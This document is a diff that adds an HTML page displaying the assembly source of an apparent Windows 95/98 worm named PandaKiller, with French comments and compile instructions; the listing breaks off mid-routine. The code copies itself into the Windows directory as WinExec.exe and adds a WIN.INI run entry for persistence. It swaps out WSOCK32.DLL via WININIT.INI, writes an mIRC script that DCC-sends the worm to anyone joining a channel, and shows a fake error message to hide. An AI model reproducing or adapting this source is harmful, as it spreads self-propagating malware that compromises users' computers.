@@ -1,0 +1,293 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>20001101 - W95.PandaKiller</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	color: #FF8000;
+}
+.sc3 {
+	color: #808080;
+}
+.sc4 {
+	color: #000080;
+}
+.sc5 {
+}
+.sc6 {
+	color: #0000FF;
+}
+.sc8 {
+	color: #8080FF;
+	background: #FFFFCC;
+}
+.sc9 {
+	color: #0080FF;
+}
+.sc10 {
+	color: #000080;
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment $</span><span class="sc0">
+</span><span class="sc1">;                 ***   **  *  * ***   **   *  * * *    *    **** ***</span><span class="sc0">
+</span><span class="sc1">;                 *  * *  * ** * *  * *  *  * *  * *    *    *    *  *</span><span class="sc0">
+</span><span class="sc1">;                 *  * *  * ** * *  * *  *  **   * *    *    **   *  *</span><span class="sc0">
+</span><span class="sc1">;                 * *  **** * ** *  * ****  **   * *    *    *    ***</span><span class="sc0">
+</span><span class="sc1">;                 *    *  * * ** *  * *  *  * *  * *    *    *    * *</span><span class="sc0">
+</span><span class="sc1">;                 *    *  * *  * ***  *  *  *  * * **** **** **** *  *</span><span class="sc0">
+</span><span class="sc1">;</span><span class="sc0">
+</span><span class="sc1">;              W95/98.PandaKiller par PandaKiller le 1er novembre 2000</span><span class="sc0">
+</span><span class="sc1">;</span><span class="sc0">
+</span><span class="sc1">; POUR COMPILER:</span><span class="sc0">
+</span><span class="sc1">;</span><span class="sc0">
+</span><span class="sc1">; tasm32 /M /ML ?????.asm</span><span class="sc0">
+</span><span class="sc1">; tlink32 -Tpe -x -aa ?????.obj,,,import32</span><span class="sc0">
+</span><span class="sc1">;</span><span class="sc0">
+</span><span class="sc1">; $</span><span class="sc0">
+
+</span><span class="sc2">.386</span><span class="sc0">
+</span><span class="sc5">jumps</span><span class="sc0">
+</span><span class="sc5">locals</span><span class="sc0">
+</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">stdcall</span><span class="sc0">
+
+</span><span class="sc1">;KERNEL32.dll</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WritePrivateProfileStringA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">DeleteFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetSystemDirectoryA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WinExec</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetSystemTime</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+
+</span><span class="sc1">;USER32.dll</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SwapMouseButton</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitWindowsEx</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetVersionExA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+
+</span><span class="sc1">;ADVAPI32.dll</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegCreateKeyExA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+
+</span><span class="sc9">.data</span><span class="sc0">
+</span><span class="sc5">szOrig</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">szCopie</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">szWsk1</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">szWsk2</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">szWin</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">szWin2</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">fh</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">octets</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">regDisp</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">regResu</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">Copie</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\WinExec.exe"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">Wsk1</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\WSOCK32.DLL"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">Wsk2</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\WSOCK32.TPK"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">Wininit</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\\WININIT.INI"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">windows</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"windows"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">run</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"run"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">Winini</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\\WIN.INI"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">nul</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"NUL"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">rename</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Rename"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">ini</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\script.tpk"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">script1</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\mirc\script.ini"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">script2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\mirc32\script.ini"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">script3</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\program files\mirc\script.ini"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">script4</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\program files\mirc32\script.ini"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">CLE</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Software\[PandaKiller]"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">TITRE</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Error Loader"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">TEXTE</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Windows NT required !"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"This program will be terminated"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+
+</span><span class="sc5">inid</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"[script]"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n0=on 1:start:{"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n1=.remote on"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n2=.ctcps on"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n3= .events on"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n4=}"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n5=on 1:join:#:{"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n6= if ( $nick == $me ) { halt } | .dcc "</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"send $nick C:\Windows\WinExec.exe"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n7=}"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+</span><span class="sc5">initaille</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">inid</span><span class="sc0">
+
+</span><span class="sc5">SYSTIME</span><span class="sc0"> </span><span class="sc9">struct</span><span class="sc0">
+</span><span class="sc5">wYear</span><span class="sc0">           </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">wMonth</span><span class="sc0">          </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">wDayOfWeek</span><span class="sc0">      </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">wDay</span><span class="sc0">            </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">wHour</span><span class="sc0">           </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">wMinute</span><span class="sc0">         </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">wsecond</span><span class="sc0">         </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">wMilliseconds</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">SYSTIME</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">
+</span><span class="sc5">SystemTime</span><span class="sc0"> </span><span class="sc5">SYSTIME</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
+
+</span><span class="sc9">.code</span><span class="sc0">
+</span><span class="sc5">DEBUT</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CLE</span><span class="sc0">            </span><span class="sc1">; V‚rifie si il existe une cl‚</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">REG</span><span class="sc0">                        </span><span class="sc1">; [PandaKiller] dans HKLM\Software.</span><span class="sc0">
+        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">regDisp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">; Si elle n'y est pas, </span><span class="sc0">
+        </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">FICHIER</span><span class="sc0">                    </span><span class="sc1">; il installe les composants</span><span class="sc0">
+
+</span><span class="sc5">WCOPIE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                        </span><span class="sc1">; Le programme se copie dans le </span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szOrig</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">         </span><span class="sc1">; dossier WINDOWS de l'ordinateur</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szCopie</span><span class="sc0">             </span><span class="sc1">; et se nommera WinExec.exe</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Copie</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szCopie</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szCopie</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szOrig</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
+
+</span><span class="sc5">WIN_INI</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                        </span><span class="sc1">; On met dans le fichier WIN.INI</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szWin2</span><span class="sc0">              </span><span class="sc1">; une routine pour que le programme</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">       </span><span class="sc1">; s'active … chaque d‚marrage.</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Winini</span><span class="sc0">              </span><span class="sc1">; Cela ‚vite d'utiliser la BASE DE</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szWin2</span><span class="sc0">              </span><span class="sc1">; REGISTRE trop voyante.</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc0">                    </span><span class="sc1">; </span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szWin2</span><span class="sc0">              </span><span class="sc1">; Dans WIN.INI du dossier WINDOWS</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szCopie</span><span class="sc0">             </span><span class="sc1">; "nom du programme"</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">run</span><span class="sc0">                 </span><span class="sc1">; run=</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">windows</span><span class="sc0">             </span><span class="sc1">; [windows]</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WritePrivateProfileStringA</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
+                                        
+</span><span class="sc5">WSOCK32</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szWsk1</span><span class="sc0">              </span><span class="sc1">; Ici, on copie le fichier du </span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">        </span><span class="sc1">; r‚pertoire SYSTEM, WSOCK32.DLL</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                        </span><span class="sc1">; </span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szWsk2</span><span class="sc0">              </span><span class="sc1">; en WSOCK32.TPK dans le mˆme</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">        </span><span class="sc1">; r‚pertoire SYSTEM</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Wsk1</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szWsk1</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Wsk2</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szWsk2</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szWsk2</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szWsk1</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
+</span><span class="sc5">WININIT</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">                        </span><span class="sc1">; Pour que l'ordinateur puisse</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szWin</span><span class="sc0">               </span><span class="sc1">; utiliser le nouveau fichier</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">       </span><span class="sc1">; WSOCK32.TPK, on va ‚crire dans</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Wininit</span><span class="sc0">             </span><span class="sc1">; le fichier WININIT.INI dans le</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szWin</span><span class="sc0">               </span><span class="sc1">; r‚pertoire WNDOWS.</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc0">                    </span><span class="sc1">; La routine est simple :</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szWin</span><span class="sc0">               </span><span class="sc1">; </span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szWsk1</span><span class="sc0">              </span><span class="sc1">; </span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nul</span><span class="sc0">                 </span><span class="sc1">; </span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rename</span><span class="sc0">              </span><span class="sc1">; [Rename]</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WritePrivateProfileStringA</span><span class="sc0"> </span><span class="sc1">; NUL=%system%\WSOCK32.DLL</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szWin</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szWsk2</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szWsk1</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rename</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WritePrivateProfileStringA</span><span class="sc0"> </span><span class="sc1">; %sys%\WSOCK32.DLL=%sys%\WSOCK32.TPK</span><span class="sc0">
+        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">FICHIER</span><span class="sc0">
+
+</span><span class="sc5">REG</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">regDisp</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">regResu</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; default security descriptor</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0F003FH</span><span class="sc0">            </span><span class="sc1">; KEY_ALL_ACCESS</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; </span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; adresse de la sous-CLE</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000002h</span><span class="sc0">          </span><span class="sc1">; HKEY_LOCAL_MACHINE </span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCreateKeyExA</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
+</span><span class="sc5">SUITE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">regResu</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; </span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">ret</span><span class="sc0">
+
+</span><span class="sc5">FICHIER</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">                  </span><span class="sc1">; Voila, un des moyens les plus</span><span class="sc0">
